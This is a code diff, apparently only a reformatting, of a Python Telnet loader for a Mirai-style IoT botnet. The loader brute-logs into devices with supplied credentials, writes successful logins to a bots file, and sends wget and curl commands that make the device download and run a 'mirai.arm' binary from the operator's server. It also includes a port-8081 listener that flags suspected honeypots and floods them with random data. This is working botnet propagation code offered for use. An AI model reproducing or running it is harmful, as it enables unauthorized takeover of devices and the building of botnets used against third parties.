@@ -19,10 +19,12 @@ yourserverip = "0.0.0.0"
 rekdevice = """paste update.sh/bins.sh here""".replace("\r", "").split("\n")
 
 global fh
-fh = open("bots.txt","a+")
+fh = open("bots.txt", "a+")
 
-def chunkify(lst,n):
+
+def chunkify(lst, n):
     return [lst[i::n] for i in xrange(n)]
+
 
 running = 0
 
@@ -48,18 +50,33 @@ def print_status():
     global ran
     while 1:
         time.sleep(5)
-        print "\033[32m[\033[31m+\033[32m] Logins: " + str(logins) + "     Ran:" + str(ran) + "  Echoes:" + str(echo) + " Wgets:" + str(wget) + " TFTPs:" + str(tftp) + "\033[37m"
+        print(
+            "\033[32m[\033[31m+\033[32m] Logins: "
+            + str(logins)
+            + "     Ran:"
+            + str(ran)
+            + "  Echoes:"
+            + str(echo)
+            + " Wgets:"
+            + str(wget)
+            + " TFTPs:"
+            + str(tftp)
+            + "\033[37m"
+        )
+
 
 # Buffer sequence
 def read_until(tn, advances, timeout=8):
-    buf = ''
+    buf = ""
     start_time = time.time()
     while time.time() - start_time < timeout:
         buf += tn.recv(1024)
         time.sleep(0.1)
         for advance in advances:
-            if advance in buf: return buf
+            if advance in buf:
+                return buf
     return ""
+
 
 # Move on if socket times out
 def recv_timeout(sock, size, timeout=8):
@@ -70,11 +87,13 @@ def recv_timeout(sock, size, timeout=8):
         return data
     return ""
 
+
 def contains(data, array):
     for test in array:
         if test in data:
             return True
     return False
+
 
 def split_bytes(s, n):
     assert n >= 4
@@ -83,66 +102,79 @@ def split_bytes(s, n):
     while start < lens:
         if lens - start <= n:
             yield s[start:]
-            return # StopIteration
+            return  # StopIteration
         end = start + n
         assert end > start
         yield s[start:end]
         start = end
 
+
 global badips
 global goodips
-badips=[]
-goodips=[]
+badips = []
+goodips = []
+
 
 def fileread():
-    fh=open("honeypots.txt", "rb")
-    data=fh.read()
+    fh = open("honeypots.txt", "rb")
+    data = fh.read()
     fh.close()
     return data
+
 
 def client_handler(c, addr):
     global badips
     global goodips
     try:
         if addr[0] not in badips and addr[0] not in fileread():
-            print addr[0] + ":" + str(addr[1]) + " has connected!"
+            print(addr[0] + ":" + str(addr[1]) + " has connected!")
             request = recv_timeout(c, 8912)
             if "curl" not in request and "Wget" not in request:
                 if addr[0] not in fileread():
-                    fh=open("honeypots.txt", "a")
-                    fh.write(addr[0]+"\n")
+                    fh = open("honeypots.txt", "a")
+                    fh.write(addr[0] + "\n")
                     fh.close()
                 badips.append(addr[0])
-                print addr[0] + ":" + str(addr[1]) + " is a fucking honeypot!!!"
+                print(addr[0] + ":" + str(addr[1]) + " is a fucking honeypot!!!")
                 c.send("fuck you GOOF HONEYPOT GET OUT\r\n")
                 for i in range(10):
-                    c.send(os.urandom(65535*2))
+                    c.send(os.urandom(65535 * 2))
             else:
                 if addr[0] not in goodips:
-                    print addr[0] + ":" + str(addr[1]) + " is a good IP!"
+                    print(addr[0] + ":" + str(addr[1]) + " is a good IP!")
                     goodips.append(addr[0])
         else:
             c.send("fuck you GOOF HONEYPOT GET OUT\r\n")
             for i in range(10):
-                c.send(os.urandom(65535*2))
+                c.send(os.urandom(65535 * 2))
         c.close()
     except Exception as e:
-        #print str(e)
+        # print str(e)
         pass
 
+
 def honeyserver():
-    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind(('', 8081))
+    s.bind(("", 8081))
     s.listen(999999999)
     while 1:
         try:
             c, addr = s.accept()
-            Thread(target=clientHandler, args=(c, addr,)).start()
+            Thread(
+                target=clientHandler,
+                args=(
+                    c,
+                    addr,
+                ),
+            ).start()
         except:
             pass
 
+
 Thread(target=honeyserver, args=()).start()
+
+
 def infect(ip, username, password):
     global badips
     global goodips
@@ -166,19 +198,19 @@ def infect(ip, username, password):
             pass
         return
     try:
-        hoho = ''
+        hoho = ""
         hoho += read_until(tn, ":")
         if ":" in hoho:
             tn.send(username + "\n")
             time.sleep(0.1)
-        hoho = ''
+        hoho = ""
         hoho += read_until(tn, ":")
         if ":" in hoho:
             tn.send(password + "\n")
             time.sleep(0.8)
         else:
             pass
-        prompt = ''
+        prompt = ""
         prompt += recv_timeout(tn, 8192)
         if ">" in prompt and "ONT" not in prompt:
             success = True
@@ -211,20 +243,21 @@ def infect(ip, username, password):
                 logins += 1
                 fh.write(ip + ":23 " + username + ":" + password + "\n")
                 fh.flush()
-                tn.send("wget http://" + yourserverip + "/mirai.arm &\r\n");
-                tn.send("curl http://" + yourserverip + ":8081/mirai.arm &\r\n");
+                tn.send("wget http://" + yourserverip + "/mirai.arm &\r\n")
+                tn.send("curl http://" + yourserverip + ":8081/mirai.arm &\r\n")
                 time.sleep(3)
                 recv_timeout(tn, 8192)
                 if ip in goodips:
                     tn.send(rekdevice)
                 tn.close()
         except Exception as e:
-            #print str(e)
+            # print str(e)
             pass
-                
+
     else:
-#        tn.close()
+        #        tn.close()
         return
+
 
 def check(chunk, fh):
     global running
@@ -260,11 +293,18 @@ def check(chunk, fh):
             pass
     running -= 1
 
+
 while 1:
     try:
         while running >= 256:
             time.sleep(0.3)
-        Thread(target = check, args = ([raw_input()], fh,)).start()
+        Thread(
+            target=check,
+            args=(
+                [raw_input()],
+                fh,
+            ),
+        ).start()
     except KeyboardInterrupt:
         os.kill(os.getpid(), 9)
     except Exception:
